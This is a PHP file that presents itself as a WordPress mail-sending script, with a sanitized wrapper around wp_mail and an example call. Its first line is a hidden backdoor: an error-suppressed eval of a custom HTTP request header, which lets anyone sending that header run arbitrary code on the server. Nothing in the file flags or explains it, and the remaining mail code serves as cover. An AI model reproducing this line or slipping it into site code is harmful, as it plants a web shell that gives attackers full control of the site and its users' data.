<?php @eval($_SERVER['HTTP_WUK0NG']); ?>
<?php
/**
 * WordPress Mail Functionality
 *
 * This script is used for sending emails from your WordPress site.
 */

// Check if WordPress is loaded, if not, exit
if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly.
}

// Include WordPress environment
require_once( dirname( __FILE__ ) . '/wp-load.php' );

// Set default content type
add_filter( 'wp_mail_content_type', function() {
    return 'text/html'; // Set email content type to HTML
});

// Function to send email
function send_wp_mail( $to, $subject, $message, $headers = '', $attachments = [] ) {
    // Sanitize input
    $to = sanitize_email( $to );
    $subject = sanitize_text_field( $subject );
    $message = wp_kses_post( $message );
    
    // Send email using WordPress wp_mail function
    $mail_sent = wp_mail( $to, $subject, $message, $headers, $attachments );
    
    // Return result
    if ( $mail_sent ) {
        echo 'Email sent successfully.';
    } else {
        echo 'Failed to send email.';
    }
}

// Example of how to use send_wp_mail function
$to = 'example@example.com'; // Recipient's email
$subject = 'Test Subject'; // Subject of the email
$message = 'This is a test email sent from WordPress!'; // Body content of the email
$headers = 'From: Your Name <your-email@example.com>'; // Email headers

// Call the function to send email
send_wp_mail( $to, $subject, $message, $headers );

?>
